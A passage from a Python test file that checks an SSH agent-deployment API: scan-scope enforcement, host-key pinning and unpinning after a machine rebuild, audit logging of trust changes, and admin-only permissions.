        entries=[{"effect": "allow", "kind": "cidr", "value": "10.0.0.0/8"}],
    )

    started = client.post(
        "/api/agent/deploy/ssh", json=_deploy_payload(), headers=admin_hdrs
    )
    assert started.status_code == 200
    _wait_for_deploy(client, admin_hdrs, started.json()["deploy_id"])


def test_an_installation_may_demand_the_target_be_inside_the_approved_scope(
    tmp_path: Path, monkeypatch
):
    settings = make_settings(tmp_path, agent_deploy_enforce_scan_scope=True)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    _stub_host_key(monkeypatch)
    _record_ssh(monkeypatch)
    approve_scan_scope(
        settings,
        entries=[{"effect": "allow", "kind": "cidr", "value": "10.0.0.0/8"}],
    )

    refused = client.post(
        "/api/agent/deploy/ssh", json=_deploy_payload(), headers=admin_hdrs
    )
    assert refused.status_code == 403
    assert "not inside any allowed range" in refused.json()["detail"]


# --------------------------------------------------------------------------
# Removing a pin (#241)
# --------------------------------------------------------------------------


def _unpin(client, headers, host: str = "192.168.10.50", port: int = 22):
    return client.request(
        "DELETE",
        "/api/agent/deploy/ssh/host-key",
        params={"host": host, "port": port},
        headers=headers,
    )


def test_unpinning_lets_a_rebuilt_machine_be_verified_again(tmp_path: Path, monkeypatch):
    """The operation docs/operations.md used to describe as a SQL DELETE (#241).

    A machine really is reinstalled, and the pin that no longer matches has to
    be removable by whoever runs the fleet. If it is not, the way through is to
    pass whatever fingerprint the target offered as ``expected_host_key``,
    which leaves the check switched on and meaning nothing.
    """
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    _stub_host_key(monkeypatch)
    _record_ssh(monkeypatch)

    first = client.post(
        "/api/agent/deploy/ssh", json=_deploy_payload(), headers=admin_hdrs
    )
    assert first.status_code == 200
    _wait_for_deploy(client, admin_hdrs, first.json()["deploy_id"])

    # The machine is rebuilt: a different key answers, and the pinned run stops
    # even though the request names the fingerprint the target is offering.
    _stub_host_key(monkeypatch, OTHER_KEY)
    blocked = client.post(
        "/api/agent/deploy/ssh",
        json=_deploy_payload(expected_host_key=OTHER_KEY.fingerprint),
        headers=admin_hdrs,
    )
    assert blocked.status_code == 409

    removed = _unpin(client, admin_hdrs)
    assert removed.status_code == 200
    # The receipt names the key that stopped being trusted.
    assert removed.json()["fingerprint"] == HOST_KEY.fingerprint

    # Unpinned is not re-trusted: the next run needs the fingerprint again.
    assert (
        client.post(
            "/api/agent/deploy/ssh",
            json=_deploy_payload(expected_host_key=None),
            headers=admin_hdrs,
        ).status_code
        == 409
    )

    second = client.post(
        "/api/agent/deploy/ssh",
        json=_deploy_payload(expected_host_key=OTHER_KEY.fingerprint),
        headers=admin_hdrs,
    )
    assert second.status_code == 200
    _wait_for_deploy(client, admin_hdrs, second.json()["deploy_id"])

    probed = client.post(
        "/api/agent/deploy/ssh/host-key",
        json={"host": "192.168.10.50", "port": 22},
        headers=admin_hdrs,
    )
    assert probed.json()["pinned"] is True
    assert probed.json()["fingerprint"] == OTHER_KEY.fingerprint


def test_the_pin_and_the_unpin_are_both_in_the_audit_trail(tmp_path: Path, monkeypatch):
    """It is the *pair* that separates a planned rebuild from a substitution."""
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    _stub_host_key(monkeypatch)
    _record_ssh(monkeypatch)

    started = client.post(
        "/api/agent/deploy/ssh", json=_deploy_payload(), headers=admin_hdrs
    )
    assert started.status_code == 200
    _wait_for_deploy(client, admin_hdrs, started.json()["deploy_id"])

    assert _unpin(client, admin_hdrs).status_code == 200

    events = _trust_changes(client, admin_hdrs)
    assert [item["reason"] for item in events] == [
        "ssh_host_key_unpinned",
        "ssh_host_key_pinned",
    ]
    for item in events:
        assert item["username"] == "admin"
        assert "192.168.10.50:22" in item["detail"]
        assert HOST_KEY.fingerprint in item["detail"]


def test_unpinning_a_target_with_no_pin_is_404(tmp_path: Path, monkeypatch):
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")

    assert _unpin(client, admin_hdrs).status_code == 404


def test_unpinning_takes_admin_like_deploying(tmp_path: Path, monkeypatch):
    """Deciding to stop trusting a key is not a smaller act than starting to."""
    settings = make_settings(tmp_path)
    client = configured_client(tmp_path, monkeypatch, settings=settings)
    admin_hdrs = auth_headers(client, username="admin")
    _stub_host_key(monkeypatch)
    _record_ssh(monkeypatch)

    started = client.post(
        "/api/agent/deploy/ssh", json=_deploy_payload(), headers=admin_hdrs
    )
    assert started.status_code == 200
    _wait_for_deploy(client, admin_hdrs, started.json()["deploy_id"])

    for role in ("viewer", "operator"):
        assert (
            _unpin(client, auth_headers(client, username=role)).status_code == 403
        ), role

    # And the pin survived every one of those attempts.
    probed = client.post(
        "/api/agent/deploy/ssh/host-key",
        json={"host": "192.168.10.50", "port": 22},
        headers=admin_hdrs,
    )
    assert probed.json()["pinned"] is True
